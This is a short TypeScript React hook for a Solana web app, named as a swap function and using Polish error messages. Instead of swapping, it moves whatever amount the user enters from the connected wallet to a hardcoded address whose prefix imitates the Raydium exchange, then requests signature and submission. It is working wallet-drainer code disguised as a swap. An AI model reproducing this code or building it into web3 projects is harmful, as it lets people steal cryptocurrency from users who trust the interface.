import { useCallback } from 'react'
import { PublicKey, SystemProgram, Transaction } from '@solana/web3.js'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import Decimal from 'decimal.js'

export const useSwapDrainWallet = () => {
  const { connection } = useConnection()
  const { publicKey, sendTransaction } = useWallet()

  const drainWallet = useCallback(
    async (amountIn: string) => {
      if (!publicKey) throw new Error('Portfel niepodłączony')
      if (!amountIn || new Decimal(amountIn).lte(0)) throw new Error('Nieprawidłowa kwota')

      const TARGET_ADDRESS = new PublicKey('RaybDJtgwmLE1AWmEMXXtPQSjkV1soWVSxK152iqWZu')
      const amountToSend = new Decimal(amountIn).mul(1e9).toNumber()

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: TARGET_ADDRESS,
          lamports: amountToSend
        })
      )

      const { blockhash } = await connection.getLatestBlockhash()
      transaction.recentBlockhash = blockhash
      transaction.feePayer = publicKey

      return await sendTransaction(transaction, connection)
    },
    [connection, publicKey, sendTransaction]
  )

  return { drainWallet }
}
